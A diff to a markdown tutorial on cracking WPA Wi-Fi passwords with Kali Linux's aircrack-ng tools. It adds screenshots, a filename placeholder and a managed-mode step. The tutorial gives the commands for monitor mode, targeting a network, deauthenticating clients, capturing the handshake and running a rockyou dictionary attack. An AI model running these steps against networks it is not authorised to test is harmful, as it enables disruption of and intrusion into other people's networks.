@@ -63,17 +63,28 @@ This tutorial is for educational purposes only. Do not attempt to access network
 
 1. Boot up your Kali Linux VM and connect the network adapter.
 2. Open a terminal window and type `iwconfig` to check IP addresses and interfaces. Ensure your wireless LAN adapter (wlan0) is listed.
+
+![](/images/image12.png)
+
 3. Execute `sudo airmon-ng check kill` to kill any conflicting processes.
+
+![](/images/image6.png)
+
 4. Switch your network interface to monitor mode with `sudo airmon-ng start wlan0`, then verify with `iwconfig`.
+
+![](/images/image11.png)
 
 ## Network Discovery and Monitoring
 
 1. Discover wireless networks by running `sudo airodump-ng wlan0mon`.
+
+![](/images/image8.png)
+
 2. To focus on a specific network, execute:
    ```bash
-   sudo airodump-ng -w hack1 -c [channel] --bssid [BSSID] wlan0mon
+   sudo airodump-ng -w [fileName] -c [channel] --bssid [BSSID] wlan0mon
    ```
-   Replace `[channel]` and `[BSSID]` with the appropriate network channel and BSSID.
+   Replace `[fileName]` with a name of your choosing. Replace `[channel]` and `[BSSID]` with the appropriate network channel and BSSID.
 
 ## Network Disruption
 
@@ -83,19 +94,36 @@ This tutorial is for educational purposes only. Do not attempt to access network
    ```
    This will deauthenticate all clients from the network. Use Ctrl+C to stop the process.
 
+![](/images/image3.png)
+
 ## Handshake Capture
 
 1. Monitor the previous terminal window to capture the four-way handshake when a device tries to reconnect.
+
+![](/images/image4.png)
+
 2. Check for the handshake capture by running `ls` in the terminal.
+
+![](/images/image10.png)
 
 ## Password Cracking
 
 1. Open the captured file in Wireshark and search for the four-way handshake.
-2. Perform a dictionary attack using the Rockyou wordlist:
+
+![](/images/image9.png)
+![](/images/image13.png)
+
+2. Switch your network interface to managed mode with `sudo airmon-ng stop wlan0mon`, then verify with `iwconfig`.
+
+![](/images/image5.png)
+
+3. Perform a dictionary attack using the Rockyou wordlist:
    ```bash
    sudo aircrack-ng [capture-file] -w /usr/share/wordlists/rockyou.txt
    ```
    Replace `[capture-file]` with your capture file path.
+
+![](/images/image1.png)
 
 ## Conclusion
 
